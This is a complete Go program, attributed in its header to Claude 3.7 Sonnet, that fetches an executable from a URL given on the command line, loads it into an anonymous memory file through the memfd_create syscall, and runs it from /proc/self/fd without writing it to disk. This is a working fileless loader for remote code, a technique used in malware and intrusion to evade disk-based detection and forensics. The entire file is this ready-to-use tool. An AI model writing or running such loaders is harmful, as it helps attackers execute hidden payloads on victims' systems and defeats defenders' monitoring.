// Claude 3.7 Sonnet generated
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// memfdCreate wraps the memfd_create syscall
// SYS_MEMFD_CREATE is syscall 319 on amd64
func memfdCreate(name string, flags uint) (fd int, err error) {
	// Constants for memfd_create which might not be defined in older Go versions
	const (
		SYS_MEMFD_CREATE = 319 // for x86_64 architecture
		MFD_CLOEXEC      = 1
	)

	bytes, err := syscall.ByteSliceFromString(name)
	if err != nil {
		return 0, err
	}
	namePtr := unsafe.Pointer(&bytes[0])

	r1, _, errno := syscall.Syscall(
		SYS_MEMFD_CREATE,
		uintptr(namePtr),
		uintptr(flags),
		0,
	)
	if errno != 0 {
		return 0, errno
	}
	return int(r1), nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./remote_memfd_exec <URL>")
		os.Exit(1)
	}

	url := os.Args[1]
	fmt.Printf("Fetching binary from: %s\n", url)

	// Download the binary
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error downloading binary: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	// Read the binary into memory
	binary, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading binary: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Downloaded %d bytes\n", len(binary))

	// Create an in-memory file using memfd_create
	memfd, err := memfdCreate("executable", 1) // 1 is MFD_CLOEXEC
	if err != nil {
		fmt.Printf("Error creating memfd: %v\n", err)
		os.Exit(1)
	}

	// Convert the fd to a file for easier writing
	memFile := os.NewFile(uintptr(memfd), "memfd")
	if memFile == nil {
		fmt.Println("Error creating file from fd")
		os.Exit(1)
	}
	defer memFile.Close()

	// Write the binary to the in-memory file
	_, err = memFile.Write(binary)
	if err != nil {
		fmt.Printf("Error writing to in-memory file: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Executing binary in memory...")

	// Get the file descriptor path
	fdPath := fmt.Sprintf("/proc/self/fd/%d", memfd)

	// Execute the binary directly from the file descriptor
	cmd := exec.Command(fdPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	// Run the command
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Error executing binary: %v\n", err)
	}

	fmt.Println("Execution completed")
}
